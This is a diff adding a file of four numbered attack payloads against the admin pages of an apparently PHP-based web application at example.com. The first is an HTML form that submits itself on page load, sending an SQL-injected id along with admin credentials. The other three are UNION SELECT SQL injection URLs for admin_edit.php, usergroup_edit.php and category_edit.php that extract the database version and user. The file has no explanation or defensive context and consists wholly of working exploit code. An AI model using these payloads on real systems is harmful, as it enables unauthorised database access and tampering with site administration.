@@ -1,0 +1,19 @@
+1.
+<form action="http://www.example.com/adm/admin_edit.php" method="post" name="main">
+<input type="hidden" name="id[1]" value="1'SQL_CODE">
+<input type="hidden" name="username[1]" value="Admin">
+<input type="hidden" name="password[1]" value="Admin">
+<input type="hidden" name="Submit" value="Submit">
+</form>
+<script>
+document.main.submit();
+</script>
+
+2.
+http://www.example.com/adm/admin_edit.php?id=999'+UNION+SELECT+version(),user(),3+--+
+
+3.
+http://www.example.com/adm/usergroup_edit.php?id=999%27+UNION+SELECT+version%28%29,user%28%29,3,4+--+
+
+4.
+http://www.example.com/adm/category_edit.php?id=999%27+UNION+SELECT+user%28%29,version%28%29,3+--+
